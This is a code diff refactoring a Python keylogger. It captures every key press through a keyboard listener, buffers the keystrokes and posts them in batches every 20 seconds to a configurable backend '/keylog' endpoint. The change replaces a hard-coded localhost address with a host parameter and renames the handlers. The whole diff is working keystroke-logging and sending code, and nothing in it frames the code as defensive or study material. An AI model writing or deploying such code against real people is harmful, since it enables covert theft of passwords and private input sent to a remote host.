@@ -5,9 +5,6 @@ from datetime import datetime
 import time
 import socket
 
-# Backend API endpoint (update if backend runs on a different host/port)
-BACKEND_URL = "http://localhost:5000/record"
-
 # Interval in seconds to send batched keystrokes
 SEND_INTERVAL = 20  # Adjust as needed (e.g., 5 seconds)
 
@@ -17,16 +14,15 @@ buffer_lock = threading.Lock()  # Thread-safe access to the buffer
 
 
 # Function to send batched keystrokes to the backend
-def send_batched_keystrokes():
+def send_batched_keystrokes(backend: str):
     while True:
         time.sleep(SEND_INTERVAL)
-        print("doing something")
         with buffer_lock:
             if keystroke_buffer:  # Only send if there are keystrokes
                 payload = keystroke_buffer.copy()
                 keystroke_buffer.clear()  # Clear the buffer after copying
                 try:
-                    response = requests.post(BACKEND_URL, json=payload)
+                    response = requests.post(f"{backend}/keylog", json=payload)
                     response.raise_for_status()
                     print(f"Sent {len(payload)} keystrokes to backend")
                 except requests.exceptions.RequestException as e:
@@ -48,7 +44,7 @@ def buffer_keystroke(key_str):
 
 
 # Function to handle key press events
-def on_press(key):
+def handle_key_press(key):
     print("{} was just preseed to buffer".format(key))
     try:
         key_str = key.char  # Alphanumeric keys
@@ -59,7 +55,7 @@ def on_press(key):
 
 
 # Function to handle key release (stops listener on Esc)
-def on_release(key):
+def handle_key_release(key):
     print("releasing something")
     if key == keyboard.Key.esc:
         # Send any remaining keystrokes before stopping
@@ -94,7 +90,9 @@ def main():
     sender_thread.start()
 
     # Start the keyboard listener
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    with keyboard.Listener(
+        on_press=handle_key_press, on_release=handle_key_release
+    ) as listener:
         listener.join()
 
 
